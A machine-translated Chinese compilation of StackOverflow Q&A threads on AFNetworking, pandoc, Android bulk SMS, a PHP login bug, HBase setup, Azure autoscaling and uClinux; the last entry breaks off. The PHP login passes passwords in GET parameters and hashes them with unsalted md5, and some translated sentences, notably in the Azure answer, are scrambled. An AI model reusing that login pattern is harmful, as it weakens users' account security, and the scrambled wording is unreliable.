# StackOverflow 问答 16122000-16122999

# objective-c - AFNetworking 下载自定义文件

> ID：16122000
> 
> 赞同：0
> 
> 时间：2013-04-20T15:24:55.460
> 
> 标签：objective-c, afnetworking

我正在尝试使用 AFNetworking 从我的服务器下载自定义文件类型 - 出于某种原因，它说它已成功下载文件，但结果似乎已损坏。

这是我在日志中得到的：

```
2013-04-20 11:17:40.326 app[18083:907] start downloads
2013-04-20 11:17:40.392 app[18083:907] Sent 283280 of 283280 bytes, /var/mobile/Applications/187878BC-9D5A-4E1C-9EE4-34512D93BF68/Documents/theprice.cm
2013-04-20 11:17:40.393 app[18083:907] Successfully downloaded file to /var/mobile/Applications/187878BC-9D5A-4E1C-9EE4-34512D93BF68/Documents/theprice.cm 
```

我的互联网速度很快，但它肯定没有在 0.04 秒内下载 283,280 字节。

这是我的 AFNetworking 代码：

```
NSLog(@"start downloads");

NSString *urlpath = [NSString stringWithFormat:@"http://www.domain.com/ygp6bcckll8mw62.cm"];
NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:urlpath]];

AFHTTPRequestOperation *operation = [[AFHTTPRequestOperation alloc] initWithRequest:request];
NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
NSString *path = [[paths objectAtIndex:0] stringByAppendingPathComponent:[NSString stringWithFormat:@"theprice.cm"]];
operation.outputStream = [NSOutputStream outputStreamToFileAtPath:path append:NO];

[operation setCompletionBlockWithSuccess:^(AFHTTPRequestOperation *operation, id responseObject) {
    NSLog(@"Successfully downloaded file to %@", path);
} failure:^(AFHTTPRequestOperation *operation, NSError *error) {
    NSLog(@"Error: %@", error);
}];

[operation setDownloadProgressBlock:^(NSUInteger bytesWritten, long long totalBytesWritten, long long totalBytesExpectedToWrite) {
    NSLog(@"Sent %lld of %lld bytes, %@", totalBytesWritten, totalBytesExpectedToWrite, path);
}];

[operation start]; 
```

当我尝试访问文件内容时，正如人们所期望的那样：它是空的。

关于为什么不能正确下载自定义文件类型的任何想法？(.cm) 我是否遗漏了 AFNetworking 代码中的某些内容以使其行为异常？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-21T02:10:36.397

您确定`outputStream`正确冲洗和关闭了吗？`AFHTTPRequestOperation`一旦接收到所有数据，可能会将传输标记为成功完成，但不知道写入持久存储的任何特殊延迟和/或要求。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-26T07:09:38.810

AFNetworking 不会向其输出流发送打开消息。`close`尽管如此，当它完成或发生错误时，它确实会向它发送一条消息。您可以尝试`open`在开始请求之前发送到输出流是否会有所帮助。

否则请注意，AFNetworking 不会从流中检查潜在的失败代码，并且不会保证所有接收到的字节都已完全写入流中。

# html - pandoc 删除的换行符

> ID：16122002
> 
> 赞同：7
> 
> 时间：2013-04-20T15:24:56.350
> 
> 标签：html, markdown, line-breaks, pandoc

我正在使用 pandoc 从 html 转换为 markdown。
Pandoc 正在删除结果中的换行符。

这是我正在使用的命令：

```
pandoc -f html -t markdown_phpextra myfile.html 
```

有没有办法将所有换行符保留在 html 文件中？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2015-01-30T10:22:00.087

挖掘一个老问题，因为我刚刚发现您可以为此指定一个 Pandoc 扩展：

```
pandoc -f markdown+hard_line_breaks -t html myfile.html 
```

这对我有用（但请注意，我使用了常规降价）。另请参阅 pandoc 的手册页以获取更多说明。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-21T03:48:02.840

较新的 pandoc 版本支持`--wrap=preserve`.

## 老答案：

Pandoc 不区分换行符和其他空格（`<pre>`标签之外），因为它们在 HTML 中没有语义上的不同。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-26T23:42:20.520

`<pre>`在需要保留空格的地方使用标签。你试过`&nbsp`或`<br>`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-04-23T18:36:53.170

我有同样的问题。我做了什么用`<p></p>`字符串替换每个换行符，`<p>`并`</p>`在开头和结尾添加和。然后我将文本传递给 pandoc。它运作良好。

# android - 在 Android 4.0 中发送和接收批量短信

> ID：16122005
> 
> 赞同：2
> 
> 时间：2013-04-20T15:25:17.437
> 
> 标签：android, android-intent, sms

因此，我阅读了几乎所有关于在 android 中发送和接收短信的主题。我目前的情况是，我可以在 Froyo 设备上使用我的代码，而在具有 ICS 的三星 GT P3100 上相同的代码会失败。失败：我可以在我的 logcat 中看到消息为 SENT，但是当有批量消息（例如 40 条消息）时，很少有随机消息丢失。在接收中也观察到相同的情况。任何形式的帮助或建议都会非常有帮助。下面是我的代码

清单.xml

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.mypackage"
android:versionCode="1"
android:versionName="3.2" >

<uses-sdk
    android:minSdkVersion="8"
    android:targetSdkVersion="15" />

<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.SEND_SMS" />
<uses-permission android:name="android.permission.WRITE_SMS" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.INSTALL_PACKAGES" />
<uses-permission android:name="android.permission.WAKE_LOCK" />

<supports-screens
    android:anyDensity="true"
    android:largeScreens="true"
    android:normalScreens="true"
    android:resizeable="true"
    android:smallScreens="true"
    android:xlargeScreens="true" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
<uses-permission android:name="android.permission.ACCESS_MOCK_LOCATION"/>

<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme">
    <receiver android:name="com.IncomingSmsCaptureApp" >
        <intent-filter android:priority="100" >
            <action android:name="android.intent.action.DATA_SMS_RECEIVED" />

            <data android:port="5000" />
            <data android:scheme="sms" />

            <action android:name="android.intent.action.BOOT_COMPLETED" />

            <category android:name="android.intent.category.HOME" />
        </intent-filter>
    </receiver>

    <activity
        android:name="com.SplashActivity"
        android:configChanges="orientation|keyboardHidden"
        android:screenOrientation="portrait"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
        android:windowSoftInputMode="stateAlwaysHidden" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
    <activity
        android:name="com.Activity_Login_From"
        android:configChanges="orientation|keyboardHidden"
        android:screenOrientation="portrait"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
        android:windowSoftInputMode="stateAlwaysHidden" >
    </activity>
    <activity
        android:name="com.Activity_Main_Form"
        android:configChanges="orientation|keyboardHidden"
        android:finishOnTaskLaunch="true"
        android:screenOrientation="portrait"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
        android:windowSoftInputMode="stateAlwaysHidden" >
    </activity>
    <activity
        android:name="com.Activity_GatePass_Entry_Form"
        android:configChanges="orientation|keyboardHidden"
        android:screenOrientation="portrait"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
        android:windowSoftInputMode="stateAlwaysHidden" >
    </activity>
    <activity
        android:name="com.Activity_GRN_Details_Form"
        android:configChanges="orientation|keyboardHidden"
        android:screenOrientation="portrait"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
        android:windowSoftInputMode="stateAlwaysHidden" >
    </activity>
    <activity
        android:name="com.Farmer_Details_Activity"
        android:configChanges="orientation|keyboardHidden"
        android:screenOrientation="portrait"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
        android:windowSoftInputMode="stateAlwaysHidden" >
    </activity>
    <activity
        android:name="com.Item_Details_Activity"
        android:configChanges="orientation|keyboardHidden"
        android:screenOrientation="portrait"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
        android:windowSoftInputMode="stateAlwaysHidden" >
    </activity>
    <activity
        android:name="com.Attribute_Details_Activity"
        android:configChanges="orientation"
        android:screenOrientation="portrait"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
        android:windowSoftInputMode="stateAlwaysHidden" >
    </activity>
    <activity
        android:name="com.Cashier_Entry_Tab"
        android:configChanges="orientation"
        android:screenOrientation="portrait"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
        android:windowSoftInputMode="stateAlwaysHidden" >
    </activity>

</application> 
```

SMS.java 发送消息

```
public class SMS {

Context mContext;
boolean smsstatus, receivedflag;
String ORG_ID, Tpin;
int is_Exception=0;
Common_Functions fun;
public static String sms_reply="false",reply_msg="";
UtilClass _util;
ProgressDialog pdauth;
public SMS(Context context) {
    mContext = context;
    fun=new Common_Functions(mContext);
    _util=new UtilClass(mContext);
}

public void sendSMS(final String phoneNumber, final String message,final String rec_no,String db_msg) {
    final String SENT = "SMS_SENT";
    String DELIVERED = "SMS_DELIVERED";
    smsstatus = false;
    receivedflag = false;
    System.out.println("Inside Sent SMS " + phoneNumber + " " + message);

    final PendingIntent sentPI = PendingIntent.getBroadcast(mContext, 0,
            new Intent(SENT), 0);

    final PendingIntent deliveredPI = PendingIntent.getBroadcast(mContext, 0,
            new Intent(DELIVERED), 0);

    // ---when the SMS has been sent---

    // ---when the SMS has been delivered---
//  mContext.registerReceiver(smsstatusDeliverRecver, new IntentFilter(DELIVERED));
     Thread background = new Thread(new Runnable() {
            @Override

            public void run() {

              try {
                  mContext.registerReceiver(smsstatusSentRecver, new IntentFilter(SENT));
                  Thread.sleep(2000);

                  SmsManager sms = SmsManager.getDefault();
                    sms.sendTextMessage("+"+phoneNumber, null, message, sentPI,
                        deliveredPI);

                System.out.println("message sent ... " + message);

                } catch (Exception e) {

                    System.out.println("Sending Thread Exception-->>"+e.toString());

                }

            }

           });
     background.start();

    try {
        System.out.println("Calling Thread" + message);
        WaitTask wt = new WaitTask(message,rec_no,db_msg);
        wt.start();
        /*WaitTaskUser waitask=new WaitTaskUser(phoneNumber,message,rec_no,db_msg);
        waitask.execute();*/

    } catch (Exception e) {
        System.out.println("Exception  =  " + e.getMessage());
    }

}
/*BroadcastReceiver smsstatusDeliverRecver=new BroadcastReceiver() {
    public void onReceive(Context arg0, Intent arg1) {
        switch (getResultCode()) {
        case Activity.RESULT_OK:
            System.out.println("Delievery status ...RESULT_OK.... " + getResultCode());
            break;
        case Activity.RESULT_CANCELED:
            System.out.println("Delievery status ...RESULT_CANCELED.... " +getResultCode());
            break;
        }
    }
};*/

BroadcastReceiver smsstatusSentRecver=new BroadcastReceiver() {
    @Override
    public void onReceive(Context arg0, Intent arg1) {

        switch (getResultCode()) {

        case Activity.RESULT_OK:
            smsstatus = true;
            receivedflag = true;
            //_util.writeToSDFile1(message+" RESULT_OK Flag--->"+smsstatus);
            System.out.println("smsstatus :RESULT_OK " + smsstatus+"receivedflag-->>"+receivedflag);
            break;
        case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
            smsstatus= false;
            receivedflag = true;
            //_util.writeToSDFile1(message+" RESULT_ERROR_GENERIC_FAILURE Flag--->"+smsstatus);

            System.out.println("smsstatus : RESULT_ERROR_GENERIC_FAILURE" + smsstatus+"receivedflag-->>"+receivedflag);
            // UtilClass.printsystem("result Fail : " + count);
            break;
        case SmsManager.RESULT_ERROR_NO_SERVICE:
            smsstatus = false;
            receivedflag = true;
            //_util.writeToSDFile1(message+" RESULT_ERROR_NO_SERVICE Flag--->"+smsstatus);
            System.out.println("smsstatus : RESULT_ERROR_NO_SERVICE" + smsstatus+"receivedflag-->>"+receivedflag);
            // UtilClass.printsystem("result No Service : " + count);
            break;
        case SmsManager.RESULT_ERROR_NULL_PDU:
            smsstatus = false;
            receivedflag = true;
            //_util.writeToSDFile1(message+" RESULT_ERROR_NULL_PDU:--->"+smsstatus);
            System.out.println("smsstatus :RESULT_ERROR_NULL_PDU " + smsstatus+"receivedflag-->>"+receivedflag);
            // UtilClass.printsystem("result NULL PDU : " + count);
            break;
        case SmsManager.RESULT_ERROR_RADIO_OFF:
            smsstatus = false;
            receivedflag = true;
        //  _util.writeToSDFile1(message+" RESULT_ERROR_RADIO_OFF:--->"+smsstatus);
            System.out.println("smsstatus :RESULT_ERROR_RADIO_OFF " + smsstatus+"receivedflag-->>"+receivedflag);
            // UtilClass.printsystem("result RADIO OFF : " + count);
            break;
        }
    }
};

class WaitTask extends Thread {

    String Message,rec_No,db_MSG;
    int Count;

    public WaitTask(String message,String rec_no,String db_msg) {

        Message = message;
        //Count = count;
        rec_No=rec_no;
        db_MSG=db_msg;
    }

    public void run() {

        long start = System.currentTimeMillis();
        System.out.println("start--->>"+start);
        long end = start + 60 * 100000;
        System.out.println("end--->>"+end);
        try{
        while (System.currentTimeMillis() < end) {

            if (receivedflag == true) {

                if (smsstatus == true) {
                    System.out.println("Received Response " + smsstatus);
                        sms_reply="true";
                        SQLConnect db=new SQLConnect(mContext);
                        db.open();

                        try {
                            String sb_code="";
                            if(!Message.startsWith("START"))
                            {
                                String[] arr=_util.split(Message, "#");

                                try {

                                    sb_code=Message.substring(Message.lastIndexOf("#")+1,Message.length());
                                    System.out.println("IN SMS sb_code--->>"+sb_code);
                                    int code =Integer.parseInt(sb_code,10);
                                    //  String query="delete FROM SENTBOX WHERE SENTBOX_CODE = "+code+" and TPIN = '"+_util.getUserData_atPosition(mContext,15,Activity_Login_From.Username)+"'";
                                    String query="UPDATE SENTBOX set SENT_STATUS='10' , SYNC_TYPE = 'GSM' WHERE SENTBOX_CODE = "+code+"";   
                                    System.out.println("IN SMS Delete Query--->>"+query);
                                        db.ExecuteSql(query);

                                }catch(Exception e)
                                {
                                    e.printStackTrace();
                                }
                                finally{
                                    if(db!=null)
                                        db.close();
                                }

                            }

                        }catch(Exception e)
                        {
                            e.printStackTrace();
                        }
                        finally{
                            if(db!=null)
                                db.close();
                        }
                        System.out.println("Breaking thread: " + Message);
                    break;
                } else {

                    sms_reply="false";

                }
            }
            //mContext.unregisterReceiver(smsstatusRecver);
        }
    }
    catch (Exception e) {
        // TODO: handle exception
    }
    finally{
        if(smsstatusSentRecver.isOrderedBroadcast())
        mContext.unregisterReceiver(smsstatusSentRecver);

    }

    }

} 
```

}

我的接收器

```
public class IncomingSmsCaptureApp extends BroadcastReceiver  {
UtilClass util;
String SENT = "SMS_SENT";
String OrgId = "", CellNo = "";
Context mContext;
Common_Functions fun;

@Override
public void onReceive(Context context, Intent intent) {

    System.out.println("Message Received...");
    util = new UtilClass(context);
    fun=new Common_Functions(mContext);
    mContext=context;
    Bundle bundle = intent.getExtras();
    SmsMessage[] msgs = null;
    String[] Messages=null;
    String port=mContext.getString(R.string.SMS_PORT);
    String url=intent.getDataString();//SMS://Localhost:Port
    if(url.indexOf(port)!=-1)
    {

             if (bundle != null) 
             {
                Object[] pdus = (Object[]) bundle.get("pdus");
                msgs = new SmsMessage[pdus.length];
                Messages= new String[pdus.length];
                for (int i = 0; i < msgs.length; i++) {
                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);

                    String msg = msgs[i].getMessageBody().toString();
                    Messages[i]=msg;
                    System.out.println("Message Received..." + msg);

                }

                for(int i=0;i<Messages.length;i++)
                {
                    fun.insertIntoDb_inbox(Messages[i],"GSM",mContext);
                }
                fun.PrecessInboxMessages(mContext);

                abortBroadcast();

             }

    }

}

public boolean isDataBaseExist() {
    File dbFile = new File(Activity_Login_From.DB_PATH
            + Activity_Login_From.DatabaseName);
    System.out.print("DataBase Exist " + dbFile.exists());
    return dbFile.exists();
} 
```

}

# php - 数据库中的空数据

> ID：16122008
> 
> 赞同：-2
> 
> 时间：2013-04-20T15:25:31.993
> 
> 标签：php

嗨，我在这里有这个代码，它是用于登录系统：

```
elseif($_GET['action'] == "login"){
if(!empty($_GET['user_name']) && !Empty($_GET['password'])){
    session_name('Huemix|Studio');
    session_set_cookie_params(2*7*24*60*60);
    sec_session_start();
    $user = sql_safe($_GET['user_name']);
    $pass = sql_safe($_GET['password']);
    $rem = sql_safe($_GET['rememberMe']);
    if(!count($err)){
        $sql = sprintf("SELECT loginid FROM login WHERE username='%s' AND password = '%s'",$user,md5($pass));
        $query = mysql_query($sql);
        $row = mysql_fetch_assoc($query);
        if(!$query){
            echo mysql_error();
        }else{
            echo $row["username"];
            echo $row["loginid"];
            //echo $user;
           // echo $pass;
        }
        if($row['username']){
            $sql = sprintf("UPDATE login SET last_login='".time()."' WHERE username = '%s' AND password = '%s' ",$user,md5($pass));
            $query = mysql_query($sql);
            if($query){
                $_SESSION['username'] = $row['username'];
                $_SESSION['id'] = $row['loginid'];
                $_SESSION['rememberMe'] = $rem;
                setcookie("HuemixRemember",$rem);
                header("Location : index.php");
            }
            echo '<p style="color: #ff0000;">Error in Login system ,, Please Call The Programmer !</p>';
        }else{
            echo '<p style="color: #ff0000;">Error in Username and/or Password !</p>';
        }
    }
}else{
    echo '<p style="color: #ff0000;">All Fields are Required !</p>';
} 
```

}

现在我对我的脚本做了一些安全功能，它们是：sec_session_start(); 和 sql_safe(); 这里有代码：sec_session_start();

```
function sec_session_start() {
    $session_name = 'sec_session_id'; // Set a custom session name
    $secure = false; // Set to true if using https.
    $httponly = true; // This stops javascript being able to access the session id. 

    ini_set('session.use_only_cookies', 1); // Forces sessions to only use cookies. 
    $cookieParams = session_get_cookie_params(); // Gets current cookies params.
    session_set_cookie_params($cookieParams["lifetime"], $cookieParams["path"], $cookieParams["domain"], $secure, $httponly); 
    session_name($session_name); // Sets the session name to the one set above.
    session_start(); // Start the php session
    session_regenerate_id(true); // regenerated the session, delete the old one. 
```

}

和 sql_safe()：

```
function sql_safe($value){
if ( $value ){
    $value = strip_tags($value);
    $value = htmlspecialchars($value); 
    $value = trim($value);
    $value = stripslashes($value);
    $value = mysql_real_escape_string($value);
    return $value;
}
else{
    return false;
} 
```

}

现在我的问题出在`echo $row["username"];` 没有打印数据的行中，并且我确定数据库中有数据并且与数据库的连接可以正常工作，我尝试`echo $user;`查看是否来自 Interred 的值的错误输入框，但输出和我埋的一样！

所以我真的不知道发生了什么！！！总是显示`Error in Login system ,, Please Call The Programmer !` 由 if 语句引起的错误`if($row['username']){`！！

另一个问题：你能告诉我一个提示或代码来保护我的脚本吗？在一切“登录、注销、会话、cookies ......等”

还有谢谢^_^

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T15:29:04.907

您没有在您的选择语句中选择用户名，这就是它无法使用的原因 - 在您选择字段时将用户名添加到您的选择语句中。

```
 SELECT loginid,username FROM login WHERE username='%s'... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T15:30:08.290

问题似乎是，您没有选择用户名：

`$sql = sprintf("SELECT loginid FROM login WHERE username='%s' AND password = '%s'",$user,md5($pass));`

应该：

`$sql = sprintf("SELECT username, loginid FROM login WHERE username='%s' AND password = '%s'",$user,md5($pass));`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T15:30:34.600

```
 }
        echo '<p style="color: #ff0000;">Error in Login system ,, Please Call The Programmer !</p>'; 
```

应该是

```
 } else {
           echo '<p style="color: #ff0000;">Error in Login system ,, Please Call The Programmer !</p>';
       } 
```

现在您只是输出该错误消息，完全忽略查询结果。

# java - 为什么 Namenode 在给定的设置中不能在 Hadoop 中工作

> ID：16122010
> 
> 赞同：3
> 
> 时间：2013-04-20T15:25:40.483
> 
> 标签：java, hadoop, hbase

我想建立 2 个节点的 HBase 集群。为此，我首先建立了 Hadoop 设置。它工作正常。Namenode、Secondary namenode、datanode、Jobtracker、Tasktracker 都在工作，但是当我为 Hbase 配置时，Namenode 卡住了。它现在不起作用。你能告诉我为什么会这样吗？

**我的问题**

1.  当 hadoop 工作时，以及当我配置 Hbase 时。它只显示一台可用的机器。但它必须显示两台机器可用，在`http://hdmaster:60010/master-status`.
2.  当我停止所有服务时，然后使用命令启动所有 , `./start-dfs.sh`, `./start-mapred.sh`。然后它显示，namenode 不工作。为什么 ？

我尝试了很多，但我不明白为什么会这样。我认为可能存在版本问题。因为教程使用的是0.94.2版本的hbase，都是从那里学到的。

我关注[了 link1](https://www.youtube.com/watch?v=PFKs592W_Rc)和[link2](https://www.youtube.com/watch?v=--lax6MCs6k)。

请帮我。寻找您的善意回应。

**一些信息**

```
OS = centOS 5.5
Java = java version "1.6.0_23"
Hadoop = 1.0.3
Hbase = hbase-0.94.6.1 
```

**master和slave的xml配置（hadoop）如下，**

**核心站点.xml**

```
<property>
        <name>fs.default.name</name>
        <value>hdfs://hdmaster:54310</value>
</property> 
```

**hdfs-site.xml**

```
<property>
        <name>dfs.replication</name>
        <value>2</value>
</property>
<property>
        <name>dfs.permission</name>
        <value>false</value>
</property>
<property>
        <name>dfs.name.dir</name>
        <value>/HADOOP/hadoop/hdfs-data-name</value>
</property>
<property>
        <name>dfs.data.dir</name>
        <value>/HADOOP/hadoop/hdfs-data</value>
</property> 
```

**mapred-site.xml**

```
<property>
        <name>mapred.job.tracker</name>
        <value>hdmaster:54311</value>
</property> 
```

**主从的hbase的xml配置如下**

**hbase-site.xml**

```
<property>
        <name>hbase.rootdir</name>
        <value>hdfs://hdmaster:54310/user/hbase</value>
</property>
<property>
        <name>hbase.cluster.distributed</name>
        <value>true</value>
</property>
<property>
        <name>hbase.zookeeper.quorum</name>
        <value>hdmaster,hdslave</value>
</property>
<property>
        <name>hbase.zookeeper.property.datadir</name>
        <value>/HADOOP/hadoop/zookeeper</value>
</property>
<property>
        <name>hbase.zookeeper.property.clientPort</name>
        <value>2222</value>
</property> 
```

**编辑编号 1**

当我按顺序运行以下命令时，

```
./start-mapred.sh

./start-dfs.sh

./start-hbase.sh 
```

然后，`./start-hbase.sh`，给出以下输出

```
[hadoop@jhamb bin]$ ./start-hbase.sh
hdmaster: starting zookeeper, logging to /usr/local/hbase-0.94.6.1/bin/../logs/hbase-hadoop-zookeeper-jhamb.adobe.intern.out
hdslave: starting zookeeper, logging to /usr/local/hbase-0.94.6.1/bin/../logs/hbase-hadoop-zookeeper-hdslave.out
starting master, logging to /usr/local/hbase-0.94.6.1/bin/../logs/hbase-hadoop-master-jhamb.adobe.intern.out
hdmaster: regionserver running as process 9551\. Stop it first.
hdslave: regionserver running as process 5850\. Stop it first. 
```

# python - mp3 文件的流式传输

> ID：16122013
> 
> 赞同：1
> 
> 时间：2013-04-20T15:25:44.900
> 
> 标签：python, windows-7, streaming, mp3

我需要一个轻量级模块，它可以从 HTTP 服务器流式传输 mp3 文件，在扬声器上播放，并允许搜索。

我将编写 GUI 部分，我只需要一个非常简单的后端来执行以下操作：

```
obj = MediaSource(r'http://myserver.com/my_song.mp3')
obj.play()
obj.seek(30) 
```

# c# - 尝试读取性能计数器时出现 Azure 自动缩放异常

> ID：16122016
> 
> 赞同：1
> 
> 时间：2013-04-20T15:26:21.067
> 
> 标签：c#, xml, azure, enterprise-library, wasabi

我正在研究 Microsoft 的一个示例，该示例展示了如何使用自动缩放（[http://www.windowsazure.com/en-us/develop/net/how-to-guides/autoscaling/](http://www.windowsazure.com/en-us/develop/net/how-to-guides/autoscaling/)）。安装在云上的工作者角色生成一个性能计数器，在本地，控制台应用程序读取此计数器并应用自动缩放。

一切看起来都很好，性能计数器可从 WADPerformanceCountersTable 获得，并且控制台应用程序可以正确访问存储，但它无法在 WADPerformanceCountersTable 中找到工作角色。这是生成的异常：

```
Autoscaling General Error: 2001 : 
Microsoft.Practices.EnterpriseLibrary.WindowsAzure.Autoscaling.DataPointsCollection.DataPointsCollectionException:
Could not retrieve performance counter with name '\Processor(_Total)\% Processor Time'
for target 'WorkerRoleExample' from the WADPerformanceCountersTable table. ---> 
System.ArgumentOutOfRangeException: Could not retrieve the role with alias 'WorkerRoleExample' from the service information store.
Please review the service information store to fix this. 
```

Autoscaling Application Block 的配置文件（这两个文件都是控制台应用程序的一部分）：

规则.xml：

```
<?xml version="1.0" encoding="utf-8" ?>
<rules xmlns="http://schemas.microsoft.com/practices/2011/entlib/autoscaling/rules">
  <constraintRules>
    <rule name="default" enabled="true" rank="1" description="The default constraint rule">
      <actions>
        <range min="1" max="2" target="WorkerRoleExample"/>
      </actions>
    </rule>
  </constraintRules>
  <reactiveRules>
    <rule name="ScaleUpOnHighUtilization" rank="10" description="Scale up the web role" enabled="true" >
      <when>
        <any>
          <greaterOrEqual operand="WebRoleA_CPU_Avg_5m" than="60"/>
        </any>
      </when>
      <actions>
        <scale target="WorkerRoleExample" by="1"/>
      </actions>
    </rule>
    <rule name="ScaleDownOnLowUtilization" rank="10" description="Scale up the web role" enabled="true" >
      <when>
        <all>
          <less operand="WebRoleA_CPU_Avg_5m" than="60"/>
        </all>
      </when>
      <actions>
        <scale target="WorkerRoleExample" by="-1"/>
      </actions>
    </rule>
  </reactiveRules>
  <operands>
    <performanceCounter alias="WebRoleA_CPU_Avg_5m"
                        performanceCounterName="\Processor(_Total)\% Processor Time"
                        source ="WorkerRoleExample"
                        timespan="00:05:00" aggregate="Average"/>
  </operands>
</rules> 
```

服务.xml：

```
<?xml version="1.0" encoding="utf-8" ?>
<serviceModel xmlns="http://schemas.microsoft.com/practices/2011/entlib/autoscaling/serviceModel">
  <subscriptions>
    <subscription name="TestingWorkerRole"
                  certificateThumbprint="**************"
                  subscriptionId="**************"
                  certificateStoreLocation="CurrentUser"
                  certificateStoreName="My">
      <services>
        <service dnsPrefix="**************" slot="Staging">
          <roles>
            <role alias="AutoscalingApplicationRole"
                  roleName="WorkerRoleExample"
                  wadStorageAccountName="targetstorage"/>
          </roles>
        </service>
      </services>
      <storageAccounts>
        <storageAccount alias="targetstorage"
          connectionString="DefaultEndpointsProtocol=https;AccountName=*****;AccountKey=*******">
        </storageAccount>
      </storageAccounts>
    </subscription>
  </subscriptions>
</serviceModel> 
```

在云端运行的 Worker 角色会生成一个性能计数器：

```
public override bool OnStart()
{
    // Set the maximum number of concurrent connections 
    ServicePointManager.DefaultConnectionLimit = 12;

    CreatePerformanceCounters();

    return base.OnStart();
}

private static void CreatePerformanceCounters()
{
    DiagnosticMonitorConfiguration diagConfig = DiagnosticMonitor.GetDefaultInitialConfiguration();

    var procTimeConfig = new PerformanceCounterConfiguration();
    procTimeConfig.CounterSpecifier = @"\Processor(_Total)\% Processor Time";
    procTimeConfig.SampleRate = TimeSpan.FromSeconds(10);

    diagConfig.PerformanceCounters.DataSources.Add(procTimeConfig);
    diagConfig.PerformanceCounters.ScheduledTransferPeriod = TimeSpan.FromMinutes(1);

    DiagnosticMonitor.Start("Microsoft.WindowsAzure.Plugins.Diagnostics.ConnectionString", diagConfig);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-22T11:47:38.580

在 services.xml 中尝试更改：

```
<role alias="AutoscalingApplicationRole"
              roleName="WorkerRoleExample"
              wadStorageAccountName="targetstorage"/> 
```

对此：

```
<role alias="WorkerRoleExample"
              roleName="WorkerRoleExample"
              wadStorageAccountName="targetstorage"/> 
```

在元素`rules.xml`的`target`属性中查找元素中`scale`的匹配`alias` `attribute`项- 它正在查找但找不到。`role``services.xml``WorkerRoleExample`

如果您在 rules.xml 中更改，而不是上述内容，它也会起作用：

```
<scale target="WorkerRoleExample" by="1"/> 
```

对此：

```
<scale target="AutoscalingApplicationRole" by="1"/> 
```

# android - ActionBarSherlock 中项目之间的分隔线

> ID：16122017
> 
> 赞同：1
> 
> 时间：2013-04-20T15:26:29.583
> 
> 标签：android, split, actionbarsherlock, divider

我需要在 actionBarSherlock 中的三个项目之间显示分隔线。我找到了一个解决方案，我需要在 ActionMenuItemView needDividerBefore() 中重写 ABS 库中的方法以始终返回 true，否则只有在连续项目中相邻的图标和文本时才会显示分隔符。这就是我所做的，然后我将分隔线设置为我的 ABS：

```
actionBar.setSplitBackgroundDrawable(res.getDrawable(R.drawable.separator)); 
```

但是分隔线是不可见的。怎么了？

# embedded - 如何将 uclinux linux 移植到任何微控制器

> ID：16122019
> 
> 赞同：1
> 
> 时间：2013-04-20T15:26:38.563
> 
> 标签：embedded, embedded-linux, uclinux

我有 Stellaris LM4f232 评估板。我已将免费的 rtos、sysbios 移植到 Stellaris lm4f232 板上，并成功开发了一个 gps 跟踪应用程序。但我一直想为我的主板移植 uc linux。我的问题是

i) 是否有任何材料可以将 uclinux 移植到任何控制器

ii）我需要哪些必要的知识来做同样的事情

我用谷歌搜索了很多。我没有得到正确的信息，但我看到了很难的帖子，但我无法实现同样的。任何帮助？？？？

iii）实现它的路线图是什么，实现它需要哪些知识

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-21T20:10:36.580

Linux，甚至 uCLinux 都需要相当多的内存资源；您希望从至少 2Mb 的引导设备和 16Mb 的 RAM 开始（尽管最小的系统可以以低至 4Mb 的空间启动）。在微控制器上，这意味着您必须有外部存储器。

另一个问题是 Cortex-M 设备经过优化以从片上闪存运行代码，具有用于 ROM 和 RAM 的单独总线，以便可以同时获取数据和指令。uClinux 必须从外部 RAM 运行，这会对性能产生不利影响，而且您不太可能达到 CM4 能够达到的每 MHz 1.25MIPS 的数值。有可能安排将时间关键代码放置在片上闪存中是必要的，但这当然是有限的资源。

可以在[此处找到有关在 Cortex-M 设备上部署 Linux 问题的一些好的建议](http://electronicdesign.com/embedded/practical-advice-running-uclinux-cortex-m3m4)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T15:29:28.370

我建议看看 buildroot，据我所知可以为这个板构建。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-06-27T10:59:43.107

添加到@Clifford，您可以使用 u-boot (bootloader)，已经为许多板配置，如果您的板不在列表中，您可以编辑它。，

# json - ListView 和数据模型 - 黑莓

> ID：16122020
> 
> 赞同：0
> 
> 时间：2013-04-20T15:27:10.580
> 
